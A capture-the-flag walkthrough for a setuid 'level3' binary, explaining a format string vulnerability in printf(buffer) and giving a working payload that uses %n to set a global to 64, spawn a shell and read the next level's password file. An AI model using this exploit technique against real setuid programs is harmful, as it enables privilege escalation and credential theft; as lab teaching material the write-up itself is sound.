# Level3 Walkthrough

Binary is setuid `level4`. `main` only calls `v`:

```c
int m;

void v(void) {
  char buffer[520];

  fgets(buffer, 512, stdin);
  printf(buffer);
  if (m == 64) {
    fwrite("Wait what?!\n", 1, 12, stdout);
    system("/bin/sh");
  }
}
```

## Vulnerability

`fgets` is bounded (512 into 520), so no overflow. The bug is `printf(buffer)`:
the user input is used directly as the format string (format string vulnerability).
With `%n`, `printf` can write the number of printed characters to an arbitrary
address.

Goal: set the global `m` to 64 so `system("/bin/sh")` runs.

## Exploitation

- Address of `m`: `nm level3 | grep ' m$'` -> `0x0804988c`.
- Offset: `python -c 'print "AAAA" + ".%x"*10' | ./level3` shows `41414141` at the
  4th position, so our buffer is argument 4.

Payload: `m` address (so `%4$n` targets it) + `%60d` so the printed count reaches
`4 + 60 = 64`, then `%4$n` writes 64 into `m`.

```sh
(python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"'; cat) | ./level3
```

```sh
whoami            # level4
cat /home/user/level4/.pass
```

